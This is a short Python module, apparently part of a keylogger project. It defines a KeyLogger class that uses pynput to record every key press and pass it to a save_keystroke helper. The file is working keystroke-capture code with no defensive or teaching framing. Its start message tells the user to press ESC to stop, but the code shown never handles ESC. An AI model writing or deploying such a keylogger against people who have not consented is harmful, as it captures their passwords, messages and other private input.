from pynput import keyboard
from .utils import format_key, save_keystroke


class KeyLogger:
    def __init__(self):
        self.listener = keyboard.Listener(on_press=self.on_key_press)

    def on_key_press(self, key):
        """Callback when a key is pressed."""
        key_str = format_key(key)
        save_keystroke(key_str)

    def start(self):
        """Start the keylogger listener."""
        print("[*] Keylogger started. Press ESC to stop.")
        with self.listener as listener:
            listener.join()